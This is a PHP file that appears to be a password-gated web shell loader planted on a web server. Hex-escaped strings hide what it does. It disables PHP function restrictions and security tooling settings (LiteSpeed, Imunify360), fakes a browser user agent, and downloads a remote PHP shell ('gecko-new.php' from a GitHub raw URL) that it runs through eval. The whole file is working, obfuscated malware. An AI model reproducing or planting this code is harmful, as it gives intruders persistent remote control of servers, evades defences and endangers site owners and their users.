<?php ?><?php error_reporting(0); if(isset($_REQUEST["ok"])){die(">ok<");};?><?php
if (function_exists('session_start')) { session_start(); if (!isset($_SESSION['secretyt'])) { $_SESSION['secretyt'] = false; } if (!$_SESSION['secretyt']) { if (isset($_POST['pwdyt']) && hash('sha256', $_POST['pwdyt']) == '5d3dd69284210d9bf0757699d14a0b5cdbda2e9285a7152e9f8bb04da989ecaa') {
      $_SESSION['secretyt'] = true; } else { die('<html> <head> <meta charset="utf-8"> <title></title> <style type="text/css"> body {padding:10px} input { padding: 2px; display:inline-block; margin-right: 5px; } </style> </head> <body> <form action="" method="post" accept-charset="utf-8"> <input type="password" name="pwdyt" value="" placeholder="passwd"> <input type="submit" name="submit" value="submit"> </form> </body> </html>'); } } }
      
<?php goto PKgfi;sM_c0:http_response_code(403);goto APaaf;APaaf:ini_set("\151\x6d\x75\156\x69\146\171\63\x36\60\56\143\154\x65\x61\156\165\x70\x5f\157\156\x5f\162\x65\163\164\157\x72\145",false);goto Qz3sx;PKgfi:error_reporting(0);goto zJbBu;B94_T:ini_set("\x6c\x73\141\160\x69\137\x62\x61\x63\153\145\x6e\144\x5f\157\146\146","\x31");goto e9R0C;Z0SUa:session_start();goto sM_c0;e9R0C:@ini_set("\x64\151\x73\141\x62\154\145\x5f\146\x75\x6e\x63\x74\151\157\156\163",0);goto Z0SUa;Qz3sx:http_response_code(404);goto Psr15;C3HHG:$kQBbF=v3cb5("\x68\x74\164\160\x73\72\57\x2f\x72\141\x77\56\x67\x69\164\x68\165\142\x75\x73\x65\162\143\x6f\156\164\x65\156\164\x2e\x63\x6f\x6d\57\x4d\141\x64\105\x78\160\154\157\x69\164\163\57\x47\145\x63\x6b\157\57\162\145\x66\163\x2f\x68\x65\x61\144\163\57\x6d\x61\151\156\57\x67\145\143\153\x6f\x2d\x6e\x65\x77\56\x70\x68\160");goto kZyqx;zJbBu:define("\x78\x57\62\112\125",true);goto B94_T;Psr15:function V3cB5($beq9B){goto opjhN;YY0xb:rHKvt($hKvcH,so4Z6,$beq9B);goto x4A8U;voNf5:$zXTKK=i7Br3($hKvcH);goto UeOBa;opjhN:$hKvcH=w1mH2();goto YY0xb;L79td:RhKVT($hKvcH,MafKt,false);goto voNf5;UeOBa:SGwZa($hKvcH);goto Ef19S;gU37T:RhKvT($hKvcH,AMzzk,"\x4d\x6f\172\x69\x6c\154\x61\x2f\x35\56\x30\x20\50\127\x69\x6e\x64\157\x77\x73\40\x4e\x54\40\x36\x2e\x31\73\x20\x72\x76\x3a\63\x32\56\x30\x29\40\x47\145\x63\153\157\57\62\x30\x31\x30\60\x31\60\61\40\x46\x69\162\145\146\x6f\170\57\63\62\x2e\60");goto I_dEZ;Ef19S:return $zXTKK;goto hRFeh;i1Jg2:rhkVT($hKvcH,QVYN3,500);goto gU37T;LvcqA:rHkvt($hKvcH,sjWmL,1);goto i1Jg2;x4A8U:rhkvt($hKvcH,uyJTb,1);goto LvcqA;I_dEZ:rhKvt($hKvcH,ZoRjJ,false);goto L79td;hRFeh:}goto C3HHG;kZyqx:echo eval("\x3f\76".$kQBbF);